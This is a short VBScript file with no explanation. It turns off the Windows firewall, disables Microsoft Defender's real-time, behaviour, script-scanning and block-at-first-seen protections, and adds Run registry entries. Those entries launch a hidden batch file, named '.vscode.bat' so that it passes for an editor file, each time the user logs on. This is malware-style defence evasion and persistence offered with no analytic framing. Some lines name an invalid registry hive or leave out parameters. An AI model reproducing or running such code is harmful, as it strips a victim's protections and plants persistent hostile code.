set ws = CreateObject("wscript.shell")

ws.run("cmd /c netsh advfirewall set currentprofile state off")
ws.run("cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1")
ws.run("cmd /c powershell Set-MpPreference -DisableBehaviorMonitoring 1")
ws.run("cmd /c powershell Set-MpPreference -DisableScriptScanning 1")
ws.run("cmd /c powershell Set-MpPreference -DisableBlockAtFirstSeen 1")
ws.run("REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /d ""C:\Users\Public\Libraries\.vscode.bat""")
ws.run("REG ADD HKEY_LOCAL_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /d ""C:\Users\Public\Libraries\.vscode.bat""")